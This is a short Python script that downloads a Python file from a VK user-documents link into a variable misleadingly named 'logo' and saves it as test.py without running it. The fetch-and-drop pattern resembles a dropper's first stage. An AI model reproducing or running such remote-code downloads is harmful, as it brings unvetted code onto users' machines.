import urllib.request
logo = urllib.request.urlopen("https://psv4.userapi.com/c856528/u49469996/docs/d4/66eee4546b8c/lda_1.py?extra=G2ahUuOFjoZVN0RnnBTRZGRd8y5lGeIz6-_LFhtHxB_PLJe5VoEcngjUpBoZ8ABpc06-XhXix7aLYWFjRoGmDvVmTMkBT3P_IJlDTQLVaUKvYWxee7f4d29xz-8TBcN6a7-FMschdAUrWnIfYYo&dl=1").read()
f = open("test.py", "wb")
f.write(logo)
f.close()







